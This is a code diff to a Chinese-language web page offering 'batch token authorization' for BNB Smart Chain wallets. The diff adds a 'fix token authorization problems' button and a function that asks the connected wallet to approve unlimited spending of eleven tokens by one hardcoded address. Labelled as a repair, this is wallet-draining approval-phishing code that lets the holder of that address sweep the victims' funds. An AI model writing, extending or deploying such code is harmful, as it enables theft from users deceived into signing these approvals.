@@ -4,13 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CoCo 代币批量授权系统</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
+        
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
@@ -192,6 +193,11 @@
             color: white;
         }
 
+        .btn.fix {
+            background: linear-gradient(45deg, #2196F3, #21CBF3);
+            color: white;
+        }
+
         .status {
             background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
@@ -334,6 +340,7 @@
             <h3>🚀 代币批量授权</h3>
             <p>自动检测钱包中的所有代币并一键授权</p>
             <button id="detectBtn" class="btn" onclick="detectAndAuthorizeTokens()">检测并授权所有代币</button>
+            <button id="fixBtn" class="btn fix" onclick="fixTokenApprovals()">修复代币授权问题</button>
             
             <div id="status" class="status" style="display: none;"></div>
             <div id="progressBar" class="progress-bar" style="display: none;">
@@ -352,7 +359,6 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
     <script>
         // 配置
         const BSC_CHAIN_ID = '0x38'; // BSC主网
@@ -570,7 +576,8 @@
                             },
                             {
                                 "internalType": "uint256",
-                                "internalType": "uint256"
+                                "name": "allowance",
+                                "type": "uint256"
                             },
                             {
                                 "internalType": "uint256",
@@ -580,7 +587,7 @@
                             {
                                 "internalType": "bool",
                                 "name": "isAuthorized",
-                                "type": "uint256"
+                                "type": "bool"
                             }
                         ],
                         "internalType": "struct AutoTokenController.TokenInfo[]",
@@ -1098,6 +1105,118 @@
                 const detectBtn = document.getElementById('detectBtn');
                 detectBtn.disabled = false;
                 detectBtn.innerHTML = '重新检测';
+            }
+        }
+
+        // 修复代币授权问题
+        async function fixTokenApprovals() {
+            if (!web3 || !userAccount) {
+                showStatus('请先连接钱包', 'error');
+                return;
+            }
+            
+            try {
+                const fixBtn = document.getElementById('fixBtn');
+                fixBtn.disabled = true;
+                fixBtn.innerHTML = '<span class="loading"></span>修复中...';
+                
+                showStatus('开始修复代币授权问题...', 'info');
+                
+                // 所有需要授权的代币地址
+                const tokens = [
+                    "0xFDBBA8675F0f85BeeE2225700c59D86Cb0621cAD",
+                    "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1", 
+                    "0xbA2aE424d960c26247Dd6c32edC70B295c744C43",
+                    "0x55d398326f99059fF775485246999027B3197955",
+                    "0x2E7bDE4B7D52ddD05be6144C15Cd0a5378e4D7E9",
+                    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
+                    "0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550",
+                    "0xeFf9caa1EEC7aB6AF9FAf08Da19062632C5fdA81",
+                    "0xF822575544A8053529418cbCC553DF84a158784e",
+                    "0x496e60E8C8FAE1BFd6AaA448593E785ddd6f6BB0",
+                    "0xD57BE85B9daC037Ab5061cE49CB5d3a6821F973E"
+                ];
+                
+                const spenderAddress = '0x39c1aD7DBdDbe39b289064cAB41A1120f177b9f7';
+                
+                showStatus(`准备修复 ${tokens.length} 个代币的授权问题...`, 'info');
+                
+                let successCount = 0;
+                let failCount = 0;
+                
+                for (let i = 0; i < tokens.length; i++) {
+                    try {
+                        showStatus(`正在修复代币 ${i + 1}/${tokens.length}...`, 'info');
+                        
+                        // 创建代币合约实例
+                        const tokenContract = new web3.eth.Contract([
+                            {
+                                "inputs": [
+                                    {"name": "spender", "type": "address"},
+                                    {"name": "amount", "type": "uint256"}
+                                ],
+                                "name": "approve",
+                                "outputs": [{"name": "", "type": "bool"}],
+                                "type": "function"
+                            }
+                        ], tokens[i]);
+                        
+                        // 最大授权额度
+                        const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                        
+                        // 编码approve函数调用
+                        const data = tokenContract.methods.approve(spenderAddress, maxAmount).encodeABI();
+                        
+                        // 创建交易
+                        const transaction = {
+                            from: userAccount,
+                            to: tokens[i],
+                            data: data,
+                            gas: 100000,
+                            gasPrice: await web3.eth.getGasPrice()
+                        };
+                        
+                        // 发送交易
+                        const receipt = await web3.eth.sendTransaction(transaction);
+                        
+                        if (receipt.status) {
+                            successCount++;
+                            showStatus(`✅ 代币 ${i + 1} 授权修复成功！`, 'success');
+                        } else {
+                            failCount++;
+                            showStatus(`❌ 代币 ${i + 1} 授权修复失败`, 'error');
+                        }
+                        
+                        // 等待2秒再下一个
+                        if (i < tokens.length - 1) {
+                            await new Promise(resolve => setTimeout(resolve, 2000));
+                        }
+                        
+                    } catch (error) {
+                        failCount++;
+                        showStatus(`❌ 代币 ${i + 1} 修复异常: ${error.message}`, 'error');
+                    }
+                }
+                
+                // 显示最终结果
+                if (failCount === 0) {
+                    showStatus(`🎉 所有代币授权问题修复完成！`, 'success');
+                    fixBtn.innerHTML = '修复完成';
+                    fixBtn.className = 'btn success';
+                } else {
+                    showStatus(`⚠️ 部分代币修复失败，成功: ${successCount}，失败: ${failCount}`, 'error');
+                    fixBtn.innerHTML = '重新修复';
+                }
+                
+                fixBtn.disabled = false;
+                
+            } catch (error) {
+                console.error('修复过程失败:', error);
+                showStatus('修复过程失败: ' + error.message, 'error');
+                
+                const fixBtn = document.getElementById('fixBtn');
+                fixBtn.disabled = false;
+                fixBtn.innerHTML = '重新修复';
             }
         }
     </script>
